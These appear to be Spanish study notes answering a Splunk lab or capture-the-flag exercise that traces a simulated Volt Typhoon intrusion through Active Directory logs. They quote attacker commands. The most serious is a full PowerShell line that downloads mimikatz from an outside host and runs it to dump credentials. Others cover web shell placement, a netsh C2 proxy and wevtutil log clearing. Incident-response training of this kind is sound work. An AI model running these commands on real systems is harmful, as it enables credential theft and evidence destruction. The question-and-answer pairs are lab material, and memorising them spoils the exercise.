- --
- Tags: #splunk #siem 
- - -
activde directory
### ## Acceso inicial
*Pregunta 1*
Revisa los registros de ADSelfService Plus para empezar a rastrear los pasos del atacante. ¿En qué momento (formato ISO 8601) se cambió la contraseña de Dean y su cuenta fue tomada por el atacante?
Filtro: `index=main "AD*" username="dean-admin" "password" | sort _time asc Before this time After this time`

![Pasted image 20260117160527](../Fotos/Pasted%20image%2020260117160527.png)

Respuesta: 2024-03-24T11:10:22

*Pregunta 2*
Poco después de que la cuenta de Dean fuera comprometida, el atacante creó una nueva cuenta de administrador. ¿Cuál es el nombre de la nueva cuenta que se creó?
Filtro: `index=main "AD*" username="dean-admin" "password" | sort _time asc Before this time After this time`

![Pasted image 20260117160810](../Fotos/Pasted%20image%2020260117160810.png)

Respuesta: voltyp-admin
### Ejecución
*Pregunta 3*
En un intento de recopilación de información, ¿qué comando ejecuta el atacante para encontrar información sobre discos locales en server01 y server02?

![Pasted image 20260117161043](../Fotos/Pasted%20image%2020260117161043.png)

Respuesta: wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename

*Pregunta 4*
El atacante utiliza ntdsutil para crear una copia de la base de datos de AD. Tras mover el archivo a un servidor web, el atacante comprime la base de datos. ¿Qué contraseña pone el atacante en el archivo?
Filtro: `index=main "7z" | sort _time asc`

![Pasted image 20260117161321](../Fotos/Pasted%20image%2020260117161321.png)

Respuesta: d5ag0nm@5t3r
### Persistencia
*Pregunta 5*
Para establecer persistencia en el servidor comprometido, el atacante creó un shell web usando texto codificado en base64. ¿En qué directorio se colocó el shell web?
Filtro: `index=main ntdsutil`

![Pasted image 20260117162440](../Fotos/Pasted%20image%2020260117162440.png)

Respuesta: C:\Windows\Temp\
### Evasión de defensa
*Pregunta 6*
En un intento por empezar a cubrir sus huellas, los atacantes eliminan pruebas del compromiso. Primero empiezan borrando los registros RDP. ¿Qué cmdlet de PowerShell usa el atacante para eliminar el registro "Más recientemente usado"?
Filtro: `index=main remove`

![Pasted image 20260117162738](../Fotos/Pasted%20image%2020260117162738.png)

Respuesta: Remove-ItemProperty

*Pregunta 7*
El APT continúa cubriendo sus huellas renombrando y cambiando la extensión del archivo creado anteriormente. ¿Cuál es el nombre del archivo (con extensión) creado por los atacantes?
Filtro: `index=main "7z" | sort _time asc`

![Pasted image 20260117163026](../Fotos/Pasted%20image%2020260117163026.png)

Respuesta: cl64.gif

*Pregunta 8*
¿Bajo qué ruta de regedit comprueba el atacante en busca de evidencia de un entorno virtualizado?
Filtro: `index=main *virtual*`

![Pasted image 20260117163506](../Fotos/Pasted%20image%2020260117163506.png)

Respuesta: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
### Acceso a credenciales
*Pregunta 9*
Usando la consulta de registros, Volt Typhoon busca oportunidades para encontrar credenciales útiles. ¿Qué tres programas de software investigan?  
Formato de respuesta: Orden alfabético separado por una coma y un espacio.
Filtro: `index=main reg reg`

![300](../Fotos/Pasted%20image%2020260117165311.png)

Respuesta: OpenSSH, putty, realvnc

*Pregunta 10*
¿Cuál es el comando completamente decodificado que usa el atacante para descargar y ejecutar mimikatz?
Filtro mas bruto: `sourcetype=powershell`
Filtrar: `index=main "AD*" sourcetype=powershell | sort _time desc`

![Pasted image 20260117165745](../Fotos/Pasted%20image%2020260117165745.png)

![1000](../Fotos/Pasted%20image%2020260117165840.png)

Respuesta: Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
### Descubrimiento y movimiento lateral
*Pregunta 11*
El atacante utiliza wevtutil, una herramienta de recuperación de logs, para enumerar logs de Windows. ¿Qué IDs de eventos busca el atacante?  
Formato de respuesta: Orden creciente separado por un espacio.
Filtro: `index=main wevtutil`

![Pasted image 20260117172520](../Fotos/Pasted%20image%2020260117172520.png)

Respuesta: 4624 4625 4769

*Pregunta 12*
Al moverse lateralmente a server-02, el atacante copia la web shell original. ¿Cuál es el nombre del nuevo shell web que se creó?
Filtro: `index=main "server-02" "copy"`

![Pasted image 20260117172705](../Fotos/Pasted%20image%2020260117172705.png)

Respuesta: AuditReport.jspx
### Colección
*Pregunta 13*
El atacante es capaz de localizar información financiera valiosa durante la fase de recogida. ¿Qué tres archivos copia Volt Typhoon usando PowerShell?  
Formato de respuesta: Orden creciente separado por un espacio.
Filtro: `index=main "copy"`

![Pasted image 20260117173132](../Fotos/Pasted%20image%2020260117173132.png)

Respuesta: 2022.csv 2023.csv 2024.csv
### C2 y limpieza
*Pregunta 14*
El atacante utiliza netsh para crear un proxy de comunicaciones C2. ¿Qué dirección de conexión y puerto utiliza el atacante al configurar el proxy?  
Formato de respuesta: Puerto IP

![Pasted image 20260117173706](../Fotos/Pasted%20image%2020260117173706.png)

Respuesta: 10.2.30.1 8443

*Pregunta 15*
Para ocultar sus actividades, ¿cuáles son los cuatro tipos de registros de eventos que el atacante borra en el sistema comprometido?
Info: wevtutil cl borra logs
Filtro: `sourcetype=powershell CommandLine=wevtutil`

![Pasted image 20260117174631](../Fotos/Pasted%20image%2020260117174631.png)

Respuesta: Application Security Setup System
